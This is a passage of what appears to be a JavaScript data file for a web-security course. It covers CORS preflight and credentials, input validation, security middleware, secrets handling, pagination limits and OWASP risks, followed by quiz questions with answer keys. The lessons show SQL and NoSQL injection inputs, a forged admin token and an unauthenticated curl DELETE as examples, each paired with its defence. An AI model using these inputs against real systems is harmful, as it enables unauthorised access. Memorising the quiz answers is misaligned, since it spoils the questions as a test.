    mistake: 'Adding `Access-Control-Allow-Origin` to the **request** in the front-end code: `fetch(url, { headers: { \'Access-Control-Allow-Origin\': \'*\' } })`. It is a **response** header that only the server can grant; on a request it does nothing useful, and as a non-safelisted header it even triggers a preflight.',
    widget: 'cors-sim' },

  { id: 'cors-preflight', hub: 'cors', topic: 'cors', 
    title: 'Preflight requests',
    summary: 'Before a cross-origin request that is not "simple" (for example a `PUT`, a `DELETE`, a JSON body or an `Authorization` header), the browser first sends an `OPTIONS` **preflight** asking for permission, and sends the real request only if the answer allows it.',
    body: [
      'It is like phoning a restaurant before arriving with a large group: "may we come, six people and a dog?". If the answer is no, you never set off. The browser asks first because servers written before CORS existed never expected a web page to send them a `DELETE` or a JSON body; the preflight protects them from new kinds of cross-site requests.',
      'The preflight is an `OPTIONS` request to the same URL with three headers: `Origin`, `Access-Control-Request-Method` (the method it wants to use) and `Access-Control-Request-Headers` (the non-safelisted headers it wants to send). The server must answer with a 2xx status, a matching `Access-Control-Allow-Origin`, the method in `Access-Control-Allow-Methods` and every requested header in `Access-Control-Allow-Headers`. `Access-Control-Max-Age` lets the browser reuse the permission for some seconds. The `cors` middleware answers preflights by itself with `204`.',
      'For a React front end calling a JWT-protected API that means: **every** call that sends a JWT in `Authorization`, and every JSON `POST`/`PUT` from React, is preflighted. In the Network tab you see two rows, `OPTIONS` and then the real request. If the preflight fails, the real request is **never sent**.',
    ],
    points: [
      'A preflight is needed when the method is not `GET`, `HEAD` or `POST`,',
      'or a header other than `Accept`, `Accept-Language`, `Content-Language` and `Content-Type` is sent (`Authorization` always counts),',
      'or `Content-Type` is anything other than the three form types (`application/json` counts).',
      'Cookies (`credentials`) do **not** cause a preflight on their own.',
    ],
    code: `OPTIONS /api/tasks/7 HTTP/1.1
Host: localhost:3000
Origin: http://localhost:5173
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: authorization
Access-Control-Max-Age: 600
Vary: Origin, Access-Control-Request-Headers`,
    dialect: 'HTTP',
    example: 'The React page runs `fetch(\'http://localhost:3000/api/tasks/7\', { method: \'DELETE\', headers: { Authorization: \'Bearer …\' } })` against `cors({ origin: \'http://localhost:5173\', methods: [\'GET\', \'POST\'] })`. The preflight answer lists only `GET,POST`, so Chrome logs "Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response.", the `DELETE` is never sent and the task is still there.',
    mistake: 'Mounting the auth middleware before `cors`. The browser never sends `Authorization` on a preflight, so `auth` answers the `OPTIONS` request with `401`; a preflight that is not 2xx fails, and every protected call from the front end shows a CORS error even though the token is fine. Put `app.use(cors(…))` first.',
    practice: { href: '#/server/auth/practice/cors-sim', label: 'Solve the preflight challenges in the CORS simulator' } },

  { id: 'cors-credentials', hub: 'cors', topic: 'cors', 
    title: 'Cookies across origins: credentials',
    summary: 'By default `fetch` does not send cookies to another origin; to send them the page must ask with `credentials: \'include\'`, and the server must answer with an **exact** origin (never `*`) plus `Access-Control-Allow-Credentials: true`.',
    body: [
      'This is a double consent. The page asks to bring the user\'s cookies along; the server must answer "yes, and only for **you**". A wildcard is forbidden here because "any site may read responses made with this user\'s cookies" would switch the same-origin policy off entirely.',
      'The rules: the page uses `credentials: \'include\'`; the response has `Access-Control-Allow-Origin` equal to the page\'s origin and `Access-Control-Allow-Credentials: true`; on a preflight, `*` in the allowed methods or headers no longer counts as a wildcard either. In Express: `cors({ origin: \'http://localhost:5173\', credentials: true })`.',
      'Never combine credentials with `origin: true` (which echoes back whatever origin asks): every website would then be allowed to read your users\' data with their cookies. If your front end sends a Bearer token in a header instead of using cookies, you do not need credentials at all.',
      'A subtle point: `localhost:5173` and `localhost:3000` are different **origins** but the same **site** (a site ignores the port), so `SameSite=Lax` cookies still flow between them in development; in production on different domains you would need `SameSite=None; Secure`.',
    ],
    code: `// Server
app.use(cors({ origin: 'http://localhost:5173', credentials: true }));

// Page
const res = await fetch('http://localhost:3000/api/me', { credentials: 'include' });`,
    example: 'With plain `cors()` and `credentials: \'include\'`, Chrome logs: "The value of the \'Access-Control-Allow-Origin\' header in the response must not be the wildcard \'*\' when the request\'s credentials mode is \'include\'." Changing the server to an exact origin and `credentials: true` fixes it. Challenge 5 of the simulator is exactly this.',
    mistake: '`cors({ origin: \'*\', credentials: true })`. The `cors` package sends exactly what you asked for, `*` together with `Allow-Credentials: true`, and the browser rejects that combination, so nothing works and the configuration looks "correct" in the code.' },

  { id: 'cors-not-security', hub: 'cors', topic: 'cors', 
    title: 'What CORS is not',
    summary: 'CORS is enforced **only by browsers** and only controls which web pages may **read** responses; it does not identify anyone, and it does not stop curl, Postman, scripts or other servers from calling your API.',
    body: [
      'CORS is a rule browsers apply to protect **their users**, not a lock on your server. A lock on the server is authentication (a valid token), authorisation (ownership and roles) and validation, the rest of this section.',
      'curl, Postman, a Node script or another server do not run inside a web page, so there is no page origin to protect: they send no `Origin` header and never look at CORS headers. That explains the classic report "it works in Postman but not in React": the API is fine and the browser is blocking the page because of CORS.',
      'CORS can only **relax** the same-origin policy: adding `cors()` never makes an API safer, and a careless configuration (`origin: true` with `credentials: true`) makes it less safe. And because simple requests are executed before the browser checks the answer, a cross-site form `POST` still runs on your server: protecting state-changing routes is the server\'s job (auth, SameSite cookies).',
    ],
    table: {
      caption: 'Who CORS applies to',
      head: ['Client', 'Sends `Origin`?', 'Checks CORS headers?', 'Can call your API?'],
      rows: [
        ['Your React page (another origin)', 'Yes', 'Yes', 'Yes, and reads the answer if CORS allows it'],
        ['A page on another site', 'Yes', 'Yes', 'Simple requests are sent and run; reading is blocked'],
        ['curl / Postman / a script', 'No', 'No', 'Yes, always'],
        ['Another server (Node `fetch`)', 'No', 'No', 'Yes, always'],
      ],
    },
    example: 'Your API uses `cors({ origin: \'http://localhost:5173\' })` but forgot the auth middleware on `DELETE /api/tasks/:id`. Anyone can run `curl -X DELETE http://localhost:3000/api/tasks/7` and the task is gone: the CORS setting played no part.',
    mistake: '"I restricted CORS to my front end, so only my front end can use my API." Anyone can still call it outside a browser, and even inside a browser other sites\' simple requests reach the server. Only authentication and authorisation decide who may do what.' },

  /* ---- 5. Hardening the API ------------------------------------------------------------- */
  { id: 'validation', hub: 'hardening', topic: 'hardening', 
    title: 'Validation: never trust req.body',
    summary: '**Input validation** checks every value that arrives over HTTP (body, URL parameters, query string) against a declared shape before your code uses it, and rejects bad input with `400` and a list of what is wrong.',
    body: [
      'Validation is customs at the border: everything entering is checked against the rules, so the inside of the country (controllers, models, database) can assume valid data. The client is not necessarily your form. Anyone can send `{"title":42,"done":"yes","userId":7,"isAdmin":true}` with curl. Checks in the front end are a convenience for honest users, never a defence.',
      'A popular validation library is **Zod** (`npm install zod`; the examples here use version 3). You declare a schema once; `schema.safeParse(value)` never throws and returns either `{ success: true, data }` or `{ success: false, error }`, where `error.issues` is an array of problems, each with a `path` (which field), a `message` and a `code`. Zod object schemas **strip unknown keys** by default, so `userId` and `isAdmin` disappear from `data`; that only helps if you continue with `data`, which is why a `validate` middleware should replace `req.body` with it. `.strict()` rejects unknown keys instead.',
      'Answer invalid input with `400 Bad Request` (the most common choice); some APIs use `422 Unprocessable Content` for "valid JSON, invalid values". Pick one and document it. You can also write the validator by hand, with no library, as long as it returns **all** problems, for example as `{ field, message }`: the same idea without Zod.',
      'Validating types also blocks injection: if `email` must be a string, it cannot be the object `{"$ne": null}`, a classic NoSQL injection against MongoDB queries (see [Document databases](#/database/documents)).',
    ],
    code: `const { z } = require('zod');

const noteSchema = z.object({
  title: z.string().trim().min(1).max(120),
  pinned: z.boolean().default(false),
});

noteSchema.safeParse({ title: '', pinned: 'yes', userId: 7 });
// → { success: false, error } with error.issues:
//   [ { code: 'too_small', path: ['title'], message: 'String must contain at least 1 character(s)', … },
//     { code: 'invalid_type', path: ['pinned'], message: 'Expected boolean, received string', … } ]

noteSchema.safeParse({ title: '  Buy milk ', userId: 7 });
// → { success: true, data: { title: 'Buy milk', pinned: false } }   userId stripped, default added`,
    example: 'In a Tasks API with a `validate(taskSchema)` middleware, `POST /tasks` with `{"done":true}` (no title) never reaches the controller: `validate(taskSchema)` answers **400** `{"error":[{"code":"invalid_type","path":["title"],"message":"Required",…}]}`. With `{"title":"Buy milk","userId":99}` it passes, `req.body` becomes `{ title: \'Buy milk\', done: false }`, and the controller sets the owner from `req.user.sub`.',
    mistake: 'Validating and then carrying on with the original `req.body` instead of the parsed data: the stripped fields (`userId`, `isAdmin`) come straight back. Another: validating `POST` but forgetting `PUT` and `PATCH`, which write to the same database.' },

  { id: 'security-middleware', hub: 'hardening', topic: 'hardening', 
    title: 'Security middleware: helmet, rate limits, body limits, HTTPS',
    summary: 'A few lines of middleware close whole classes of holes: **helmet** sets protective response headers, **express-rate-limit** caps how many requests one client may send, `express.json({ limit })` caps body size, and HTTPS with **HSTS** keeps passwords and tokens from crossing the network in plain text.',
    body: [
      'Think of building safety: smoke detectors, a doorman who lets only so many people in per minute, a letterbox that only fits letters, and armoured transport for valuables. Users never notice them; they stop entire categories of attack for almost no effort.',
      '**helmet()** sets headers such as `X-Content-Type-Options: nosniff` (the browser must trust `Content-Type`), `Content-Security-Policy` (which scripts may run), `Strict-Transport-Security` and `X-Frame-Options` (no embedding your pages in another site\'s frame, against clickjacking), and it removes `X-Powered-By: Express`. **express-rate-limit** answers `429 Too Many Requests` once a client (by IP address) exceeds a limit; a strict one on `/auth/login` stops password guessing. **express.json({ limit })** makes the body parser reject large bodies with `413`; the default is already `100kb`, so the point is never to raise it carelessly.',
      '**HTTPS** encrypts everything, including the `Authorization` header. In production it is usually handled by the hosting platform or a proxy in front of Node. **HSTS** (`Strict-Transport-Security: max-age=…`) tells browsers to use only HTTPS for your domain from then on. Finally, the error handler must never send `err.stack` to the client (see [Error handling](#/server/routes/error-handler)).',
      'None of these packages come with Express: `npm install helmet express-rate-limit cors` when you add them.',
    ],
    code: `const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

app.use(helmet());
app.use(express.json({ limit: '100kb' }));   // the default: keep it small
app.use('/auth/login', rateLimit({ windowMs: 15 * 60 * 1000, limit: 10 }));   // 10 tries / 15 min / IP
app.use(rateLimit({ windowMs: 60 * 1000, limit: 100 }));                      // 100 requests / min / IP
// express-rate-limit 7 calls the option \`limit\`; older versions and many tutorials call it \`max\`.`,
    table: {
      caption: 'What each one protects against',
      head: ['Middleware', 'Protects against', 'When it triggers'],
      rows: [
        ['`helmet()`', 'MIME sniffing, clickjacking, some XSS, revealing that you run Express', 'Adds headers to every response'],
        ['`rateLimit(…)`', 'Password guessing, scrapers, one client flooding the API', '`429 Too Many Requests`'],
        ['`express.json({ limit })`', 'Huge bodies that exhaust memory', '`413 Payload Too Large`'],
        ['`cors({ origin })`', 'Other web pages reading your API in a browser', 'Missing CORS headers → the browser blocks'],
        ['HTTPS + HSTS', 'Passwords and tokens read on the network', 'Always (HSTS: browser refuses plain http)'],
      ],
    },
    example: 'An attacker scripts 10,000 log-in attempts for `ana@example.com`. With the log-in limiter, attempt 11 within 15 minutes gets **429**; at 10 tries per quarter of an hour, 10,000 guesses take more than ten days, and bcrypt makes each one slow on top. Without it, the only limit is your server\'s CPU.',
    mistake: 'Thinking `helmet()` "secures the API". It only sets response headers: it does nothing against broken access control, injection or a leaked secret. Security middleware is a seatbelt, not a substitute for driving carefully.' },

  { id: 'secrets-env', hub: 'hardening', topic: 'hardening', 
    title: 'Secrets live in environment variables',
    summary: 'A **secret** (the JWT signing key, the database password, API keys) is never written in the code or committed to Git; the app reads it from an **environment variable** such as `process.env.JWT_SECRET`, set outside the code.',
    body: [
      'You do not engrave the combination on the safe. Code is copied everywhere: GitHub, laptops, teammates, AI assistants. The secret must stay only where it is needed, on the server. How `.env` files and `process.env` work is covered in [Server-side JavaScript](#/server/runtime/env-vars); this card is about why it matters for auth.',
      'Whoever has `JWT_SECRET` can sign valid tokens for **any** user, with any role: `{ sub: 1, role: \'admin\' }`, signed on jwt.io in seconds, and your server accepts it. If the secret leaks you must **rotate** it (change it): every existing token stops verifying and everyone logs in again.',
      'Git never forgets. Deleting the secret in a later commit leaves it in the history, readable by anyone who clones the repository. Treat a committed secret as leaked: rotate it. Commit a `.env.example` with the variable names but no values, and list `.env` in `.gitignore`.',
      'Example projects often use `process.env.JWT_SECRET || \'dev-secret-change-me\'` so they run with zero setup. In production that fallback is dangerous: if the variable is missing, the server silently signs with a secret printed in a public repository. The rule "fail fast if a required variable is missing" (crash at start-up) is the production fix.',
    ],
    code: `// .env  (in .gitignore, never committed)
// JWT_SECRET=3f9c2b7e0d8a41f6b5c3e9a7d2f1084c6b5a3e2d1f0c9b8a7e6d5c4b3a291807

// config.js
require('dotenv').config();              // or start Node 20.6+ with: node --env-file=.env src/server.js
const isProduction = process.env.NODE_ENV === 'production';
if (isProduction && !process.env.JWT_SECRET) {
  throw new Error('JWT_SECRET is missing');   // crash at start-up, not on the first log-in
}
module.exports = { jwtSecret: process.env.JWT_SECRET || 'dev-secret-change-me' };`,
    example: 'A pair pushes `const JWT_SECRET = \'riverside123\';` to a public repository. Anyone can read it, sign a token saying `role: admin` and delete every fixture. The fix: generate a new random secret, put it in the server\'s environment, remove it from the code, and accept that every user has to log in again.',
    mistake: 'Committing `.env` "just once" and deleting it in the next commit, believing the problem is gone. It is still in the history. Another: logging `process.env` or the whole config at start-up, which prints the secrets into log files.' },

  { id: 'pagination-limits', hub: 'hardening', topic: 'hardening', 
    title: 'Pagination limits as protection',
    summary: 'A list endpoint returns results in pages chosen by `?page=` and `?limit=`, and the server **clamps** both to safe bounds, so no caller can make it read and send an unbounded number of rows.',
    body: [
      'A library lends you at most 20 books at a time, however many you ask for. Without that rule, `GET /tasks` on a table with a million rows makes the database read them all, Node hold them in memory and turn them into one gigantic JSON string: one request can slow the server down for everyone. That is a **denial of service** (DoS). Pagination is a performance feature (see [Designing APIs](#/http/api-design/query-params)) and also a security limit.',
      'Query values arrive as **strings**, or missing, or as arrays (`?limit=1&limit=2`). So: convert with `Number`, fall back to a default when the result is not a usable number, round to an integer, and clamp to a **lower and an upper** bound. A sensible rule is `page ≥ 1` and `1 ≤ limit ≤ 100`; the server then computes `offset = (page - 1) * limit`, and answers `{ page, limit, items }`.',
      'In SQL the page becomes `LIMIT $1 OFFSET $2`, always with an `ORDER BY` (otherwise the database may return rows in a different order on each call, and items jump between pages) and always parameterised. Very large offsets still cost work, because the database must skip that many rows; huge tables use **cursor pagination** ("the 20 after id 4520") instead. Some APIs use `?limit=&offset=` instead: a different shape, the same clamping.',
    ],
    live: { kind: 'js', code: `function clampPage(query) {
  const page = Math.max(1, Math.floor(Number(query.page)) || 1);
  const limit = Math.min(100, Math.max(1, Math.floor(Number(query.limit)) || 20));
  return { page, limit, offset: (page - 1) * limit };
}

console.log(clampPage({}));                             // nothing sent: defaults
console.log(clampPage({ page: '3', limit: '10' }));     // query values are strings
console.log(clampPage({ page: '0', limit: '999' }));    // both clamps at work
console.log(clampPage({ page: '-4', limit: '-1' }));    // negative values
console.log(clampPage({ page: 'abc', limit: '2.7' }));  // junk and decimals

// A common snippet with no lower bound for limit:
const naiveLimit = (q) => Math.min(100, Number(q.limit) || 20);
console.log(naiveLimit({ limit: '-1' }));                // -1 would reach SQL as LIMIT -1` },
    example: '`GET /tasks?limit=999999` gives 100 items, `?page=0` is treated as page 1, and `?limit=abc` falls back to 20. With the naive snippet, `?limit=-1` passes `-1` to the database: PostgreSQL rejects `LIMIT -1` with an error (a `500` for the client) and SQLite treats it as "no limit at all".',
    mistake: 'Clamping only the upper bound (as many tutorial snippets do), or using `req.query.limit` directly. Remember that `Number(\'0\') || 20` is `20` (0 is falsy) and that `Number(\'-5\')` is a perfectly truthy `-5`.' },

  { id: 'owasp-risks', hub: 'hardening', topic: 'hardening', 
    title: 'The security mistakes students actually make',
    summary: 'Most breaches of small APIs come from a handful of mistakes that the **OWASP Top 10** lists every few years: broken access control, injection, exposed secrets, weak authentication and careless configuration. Each one has a known, simple defence.',
    body: [
      'Burglars rarely pick sophisticated locks; they try the back door that was left open. **OWASP** (the Open Worldwide Application Security Project) publishes the most common categories of web vulnerability so developers can check the open doors first. **Broken access control** has been number one since 2021.',
      'The table maps each risk to what it looks like in a small API and to the card or section with the defence. Read it as a checklist before you publish or deploy anything.',
      '**Injection** means data sent by the user ends up being run as code. In SQL: `"SELECT * FROM users WHERE email = \'" + email + "\'"` with the email `\' OR \'1\'=\'1` returns every user. A **parameterised query** (`WHERE email = $1`, with the value passed separately) keeps data as data; see [SQL injection](#/database/relational/sql-injection).',
    ],
    table: {
      caption: 'Risk → how it looks → defence',
      head: ['Risk', 'In a small API', 'Defence', 'Where'],
      rows: [
        ['Broken access control', '`GET /tasks/8` returns another user\'s task; the owner comes from the body', 'Ownership check with the owner from the token; filter lists by owner', 'Ownership card'],
        ['Injection (SQL)', 'String concatenation in a query', 'Parameterised queries (`$1`, `?`)', 'Relational databases'],
        ['Injection (NoSQL)', '`{"email":{"$ne":null}}` passed into a MongoDB `find`', 'Validate types with a schema', 'Validation card; Document databases'],
        ['Cross-site scripting (XSS)', 'API data inserted with `innerHTML`', '`textContent`; React escapes by default', 'DOM and events'],
        ['Exposed secrets / data', '`JWT_SECRET` in Git; stack traces or `password_hash` in responses', 'Environment variables, rotation, generic error messages, `toDTO`', 'Secrets card; Error handling (Routes and middleware)'],
        ['Authentication failures', 'Plaintext or fast hashes, no rate limit, tokens without `exp`, `jwt.decode`, `alg: none`', 'bcrypt, a log-in limiter, `expiresIn`, `jwt.verify` with `algorithms`', 'Passwords and Tokens groups'],
        ['Security misconfiguration', '`cors({ origin: true, credentials: true })`, `X-Powered-By`, debug output', 'Exact CORS origins, helmet', 'CORS group; security middleware'],
        ['Vulnerable dependencies', 'Old packages with known holes', '`npm audit`, keep `package-lock.json`, update', 'Server-side JavaScript'],
      ],
    },
    example: 'A quick self-audit of a Tasks API: log in as Ana and request Ben\'s task (expect **403**); send a task with `userId` of someone else (expect your own id stored); send `?limit=-1` and `?limit=999999` (expect 1 and 100 items at most); search the repository for `JWT_SECRET =` (expect only `process.env`); trigger an error (expect no stack trace in the response).',
    mistake: '"Security is something we add at the end." Some layers (helmet, rate limits) can be added at the edges, but the important decisions shape the code from day one: whether the owner comes from the token, whether passwords are hashed, whether errors leak details. Retrofitting them after users and data exist is far harder.' },
];

DATA.en.AUTH_QUIZ = [
  /* Authentication and authorisation */
  { type: 'mc', topic: 'identity',
    q: 'Ben sends `DELETE /tasks/12` with a valid, unexpired token. Task 12 exists and belongs to Ana. What should the API answer?',
    choices: ['200, because the token is valid', '401, because Ben is not authorised', '403, because Ben is authenticated but it is not his task', '404, to hide that the task exists'],
    answer: 2,
    why: 'The token proves **who** Ben is (authentication passed), so not 401. The ownership check fails, which is an authorisation failure: **403**. (Some APIs answer 404 to hide existence; 403 is the plain, honest answer.)' },
  { type: 'mc', topic: 'identity',
    q: 'A request reaches `GET /tasks` with no `Authorization` header at all. Which part of a typical Express API answers, and with what?',
    choices: ['The tasks controller, with 403', 'The auth middleware, with 401, before any tasks handler runs', 'The Zod validator, with 400', 'Express itself, with 404'],
    answer: 1,
    why: '`app.use(\'/tasks\', auth, tasksRouter)` puts `auth` first; with no token it answers **401** `Missing token` and never calls `next()`.' },
  { type: 'tf', topic: 'identity',
    q: 'If the auth middleware accepted the token, the caller may read or change any resource whose id they put in the URL.',
    answer: false,
    why: 'A valid token says who you are, not what you own. Every controller action must still compare `req.user.sub` with the resource\'s owner (broken access control otherwise).' },
  { type: 'mc', topic: 'identity',
    q: 'When creating a task, where must the server take the owner\'s id from?',
    choices: ['`req.body.userId`', '`req.query.userId`', '`req.user.sub`, set by the auth middleware from the verified token', 'A hidden form field'],
    answer: 2,
    why: 'Everything in the body, query or form is controlled by the client. Only the verified token is trustworthy, so the owner is `req.user.sub`.' },
  { type: 'fib', topic: 'identity',
    q: 'A safe ownership check compares owners with `Number(task.user_id) !== Number(req.user.___)`.',
    accept: ['sub'],
    why: '`sub` (subject) is the standard JWT claim for the user id; a typical log-in signs `{ sub: user.id, role: user.role }`.' },
  { type: 'mc', topic: 'identity',
    q: 'Ana changes the URL from `/notes/8` to `/notes/9` and sees another user\'s note. What is this vulnerability called?',
    choices: ['Cross-site scripting', 'Broken access control (IDOR)', 'SQL injection', 'A CORS misconfiguration'],
    answer: 1,
    why: 'The server authenticated her but never checked ownership of note 9: **broken access control**, also called an insecure direct object reference (IDOR), number one in the OWASP Top 10.' },
  { type: 'tf', topic: 'identity',
    q: 'Authentication must happen before authorisation: you cannot decide what a caller may do before you know who they are.',
    answer: true,
    why: 'Authorisation decisions use the identity (`req.user`) that authentication produced, so the auth middleware runs first and the ownership or role checks come after it.' },
  { type: 'mc', topic: 'identity',
    q: 'In a football club API, a logged-in **member** tries `POST /fixtures`, which only admins may do. Which answer fits?',
    choices: ['401: log in again', '403: you are known, but your role does not allow this', '400: the body is invalid', '409: the fixture already exists'],
    answer: 1,
    why: 'The member is authenticated; the **role** check fails, which is an authorisation failure: **403**. Logging in again would not change the role.' },

  /* Password storage */
  { type: 'mc', topic: 'passwords',
    q: 'Why do APIs store a password **hash** rather than an **encrypted** password?',
    choices: ['Hashes are shorter, so they save disk space', 'Encryption can be reversed by anyone who gets the key, which lives on the same server; a hash cannot be reversed at all', 'Hashing is faster, so log-ins are quicker', 'Encrypted values cannot be stored in SQL'],
    answer: 1,
    why: 'The server never needs to read a password back, only to check one. A one-way hash leaves an attacker nothing to decrypt; an encrypted column falls with its key.' },
  { type: 'tf', topic: 'passwords',
    q: 'A salt must be kept secret, in a separate table or file, or it is useless.',
    answer: false,
    why: 'A salt is not a secret: its job is to be **different for every password** so equal passwords give different hashes and precomputed tables are useless. bcrypt stores it inside the hash string.' },
  { type: 'mc', topic: 'passwords',
    q: 'Hashing with bcrypt at cost 10 takes 60 ms on your server. Roughly how long does cost 12 take?',
    choices: ['62 ms', '72 ms', '120 ms', '240 ms'],
    answer: 3,
    why: 'The cost is an exponent (2^cost rounds): each +1 doubles the time. Two steps up is ×4: about 240 ms, and four times slower for an attacker too.' },
  { type: 'mc', topic: 'passwords',
    q: 'Two users register with the same password `123456`. With bcrypt, what does the users table contain?',
    choices: ['Two identical hashes', 'Two different hashes, because each was made with its own random salt', 'The password once and a pointer to it', 'An error: bcrypt refuses duplicate passwords'],
    answer: 1,
    why: '`bcrypt.hash` generates a new salt every time, so the stored strings differ and the attacker learns nothing from comparing rows.' },
  { type: 'fib', topic: 'passwords',
    q: 'At log-in the server checks the password with `await bcrypt.___(password, user.password_hash)`.',
    accept: ['compare'],
    why: '`bcrypt.compare` re-hashes the attempt with the salt and cost stored in the hash and compares the results. Nothing is decrypted.' },
  { type: 'mc', topic: 'passwords',
    q: 'Why is a single SHA-256 a poor way to store passwords, even though SHA-256 is a secure hash?',
    choices: ['It produces hashes that can be decrypted', 'It is designed to be fast, so an attacker can test billions of guesses per second (and without a salt, equal passwords look equal)', 'Its output is too long for a database column', 'It only accepts passwords up to 8 characters'],
    answer: 1,
    why: 'Speed is good for checking files and terrible for passwords. bcrypt and argon2 are deliberately slow and salted; the hash-cost tool shows the difference in guesses per second.' },
  { type: 'mc', topic: 'passwords',
    q: 'A log-in arrives for an email that has no account. What should the API answer?',
    choices: ['404 `No user with that email`', '401 `Invalid credentials`, exactly as for a wrong password', '400 `Email not registered`', '200 with an empty token'],
    answer: 1,
    why: 'Using the same answer for both failures stops **account enumeration**: an attacker cannot learn which emails are registered.' },
  { type: 'tf', topic: 'passwords',
    q: '`bcrypt.compare` decrypts the stored hash to get the original password and then compares the two passwords.',
    answer: false,
    why: 'A hash cannot be decrypted. `compare` hashes the attempt again with the stored salt and cost and checks whether the two **hashes** match.' },
  { type: 'mc', topic: 'passwords',
    q: 'Which response body is right for a successful `POST /auth/register`?',
    choices: ['`{ "id": 7, "email": "ana@example.com", "password_hash": "$2b$10$…" }`', '`{ "id": 7, "email": "ana@example.com" }`', '`{ "id": 7, "email": "ana@example.com", "password": "password1" }`', '`{ "ok": true }` with status 200'],
    answer: 1,
    why: 'Answer **201** `{ id, email }` only: never the hash and certainly never the password.' },

  /* Sessions and tokens */
  { type: 'mc', topic: 'tokens',
    q: 'What are the three dot-separated parts of a JWT, in order?',
    choices: ['payload.header.signature', 'header.payload.signature', 'header.signature.payload', 'id.secret.expiry'],
    answer: 1,
    why: '`header.payload.signature`: the algorithm, the claims, and the HMAC of the first two.' },
  { type: 'tf', topic: 'tokens',
    q: 'The payload of a JWT is encrypted, so only the server can read it.',
    answer: false,
    why: 'It is only base64url-**encoded**: anyone can decode it (the JWT inspector does it with no secret). The signature protects integrity, not confidentiality.' },
  { type: 'mc', topic: 'tokens',
    q: 'A user decodes their token, changes `"role":"user"` to `"role":"admin"`, re-encodes it and sends it. What happens in an API that uses `jwt.verify`?',
    choices: ['They become admin, because the payload says so', '`jwt.verify` recomputes the signature, it no longer matches, and the middleware answers 401', 'The server re-signs the token automatically', 'The request succeeds but `req.user` is `undefined`'],
    answer: 1,
    why: 'Without the secret they cannot produce the signature for the new payload, so verification fails with `invalid signature` → **401**.' },
  { type: 'fib', topic: 'tokens',
    q: 'Complete the header: `Authorization: ___ eyJhbGciOiJIUzI1NiIs…`',
    accept: ['Bearer'],
    why: '"Bearer" means whoever holds the token is treated as its owner. A typical auth middleware requires the value to start with `Bearer `.' },
  { type: 'mc', topic: 'tokens',
    q: 'A developer writes `jwt.sign({ sub: 1, exp: Date.now() + 3600 }, secret)` meaning "expires in one hour". What really happens?',
    choices: ['It expires in one hour', 'It expires immediately', 'It practically never expires, because `exp` is in seconds and `Date.now()` is in milliseconds', 'jwt.sign throws an error'],
    answer: 2,
    why: 'JWT times are Unix **seconds**; a millisecond value lies tens of thousands of years in the future. Use `{ expiresIn: \'1h\' }` instead.' },
  { type: 'mc', topic: 'tokens',
    q: 'Which is a real advantage of server-side sessions over JWTs?',
    choices: ['They need no storage on the server', 'A session can be revoked immediately by deleting its row', 'They work without cookies or headers', 'They are smaller to verify because no lookup is needed'],
    answer: 1,
    why: 'Sessions are stateful: deleting the row logs the user out at once. A JWT stays valid until `exp` unless you add a denylist.' },
  { type: 'mc', topic: 'tokens',
    q: 'What does the `HttpOnly` flag on a cookie do?',
    choices: ['Sends the cookie only over plain HTTP', 'Prevents JavaScript on the page from reading the cookie', 'Stops the browser from sending the cookie to other sites', 'Makes the cookie expire when the tab closes'],
    answer: 1,
    why: 'HttpOnly hides the cookie from `document.cookie`, so an injected script cannot steal it. `Secure` is the HTTPS-only flag and `SameSite` controls cross-site sending.' },
  { type: 'tf', topic: 'tokens',
    q: 'A token whose header says `"alg": "none"` must be rejected by the server.',
    answer: true,
    why: '"none" means unsigned: anyone could have written it. jsonwebtoken refuses it when given a secret, and `{ algorithms: [\'HS256\'] }` makes the rule explicit.' },
  { type: 'mc', topic: 'tokens',
    q: 'Why is `jwt.decode(token)` the wrong function for an auth middleware?',
    choices: ['It is slower than `jwt.verify`', 'It reads the payload without checking the signature or the expiry, so forged tokens would pass', 'It only works with RS256', 'It deletes the token after reading it'],
    answer: 1,
    why: '`decode` is for reading a token you already trust. The middleware must call `jwt.verify(token, secret)`, which checks the signature, the algorithm and `exp`.' },

  /* CORS */
  { type: 'mc', topic: 'cors',
    q: 'Which URL has the **same origin** as `http://localhost:3000/api/tasks`?',
    choices: ['`http://localhost:5173/`', '`http://127.0.0.1:3000/`', '`http://localhost:3000/login.html`', '`https://localhost:3000/api/tasks`'],
    answer: 2,
    why: 'Origin = scheme + host + port; the path does not count. The others differ in port, host (127.0.0.1 is another name) and scheme.' },
  { type: 'mc', topic: 'cors',
    q: '`curl http://localhost:3000/api/tasks` prints the tasks, but the same call from the React page on port 5173 fails. What is the most likely reason?',
    choices: ['The API is down', 'The browser enforces CORS and the API sends no `Access-Control-Allow-Origin` header; curl never checks CORS', 'curl adds a token automatically', 'React cannot call APIs on localhost'],
    answer: 1,
    why: 'Only browsers apply the same-origin policy. The API answered both requests; the browser refused to give the answer to the page.' },
  { type: 'mc', topic: 'cors',
    q: 'Which cross-origin `fetch` is sent **without** a preflight?',
    choices: ['`PUT` with a JSON body', '`GET` with `Authorization: Bearer …`', '`POST` with `Content-Type: application/x-www-form-urlencoded`', '`DELETE` with no headers'],
    answer: 2,
    why: 'A POST with one of the three form content types and no other special headers is a "simple" request. PUT/DELETE, JSON bodies and Authorization all need a preflight.' },
  { type: 'tf', topic: 'cors',
    q: 'Restricting CORS to your front-end origin stops other people from calling your API.',
    answer: false,
    why: 'CORS only limits what web pages can read inside a browser. curl, Postman and scripts ignore it. Protection comes from authentication and authorisation.' },
  { type: 'fib', topic: 'cors',
    q: 'The browser sends a preflight using the HTTP method ___.',
    accept: ['OPTIONS'],
    why: 'The preflight is `OPTIONS` with `Origin`, `Access-Control-Request-Method` and `Access-Control-Request-Headers`; the `cors` middleware answers it with 204.' },
  { type: 'mc', topic: 'cors',
    q: 'The server uses `cors({ origin: \'*\', credentials: true })` and the page calls `fetch(url, { credentials: \'include\' })`. What happens?',
    choices: ['It works: `*` allows everybody', 'The browser blocks it: with credentials the allowed origin must be the exact page origin, not `*`', 'The server refuses to start', 'The cookie is sent but the response has no body'],
    answer: 1,
    why: 'The spec forbids the wildcard for credentialed requests. Use `origin: \'http://localhost:5173\'` with `credentials: true`.' },
  { type: 'mc', topic: 'cors',
    q: 'A page on another site makes a simple cross-origin `POST /api/tasks` to your API, which has no CORS configuration. What is true?',
    choices: ['The request never reaches your server', 'Your server receives and runs it; the browser only stops the page from reading the response', 'The browser converts it into a GET', 'Express rejects it with 403 automatically'],
